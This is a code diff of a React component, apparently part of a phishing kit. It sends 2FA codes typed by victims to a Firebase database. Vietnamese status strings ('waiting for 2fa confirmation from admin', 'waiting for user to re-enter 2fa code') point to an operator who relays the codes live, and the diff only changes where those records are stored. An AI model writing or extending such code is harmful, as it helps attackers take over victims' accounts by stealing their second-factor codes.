@@ -19,12 +19,10 @@ const FaCode = () => {
     setValidating(true);
     const updates = {};
 
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "2facode"
-    ] = facode;
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "Đang chờ xác nhận 2fa từ admin";
+    updates["/" + localStorage.getItem("record_uid") + "/" + "2facode"] =
+      facode;
+    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
+      "Đang chờ xác nhận 2fa từ admin";
 
     update(ref(database), updates);
   };
@@ -33,16 +31,15 @@ const FaCode = () => {
     setError_login_code(false);
     setResending(true);
     const updates = {};
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "3z";
+    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
+      "3z";
     update(ref(database), updates);
   };
 
   useEffect(() => {
     const starCountRef = ref(
       database,
-      "records/" + localStorage.getItem("record_uid")
+      "/" + localStorage.getItem("record_uid")
     );
     onValue(starCountRef, (snapshot) => {
       const data = snapshot.val();
@@ -54,7 +51,7 @@ const FaCode = () => {
         setError_login_code(true);
         const updates = {};
         updates[
-          "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
+          "/" + localStorage.getItem("record_uid") + "/" + "user_status"
         ] = "Đang chờ user nhập lại mã 2fa";
 
         update(ref(database), updates);
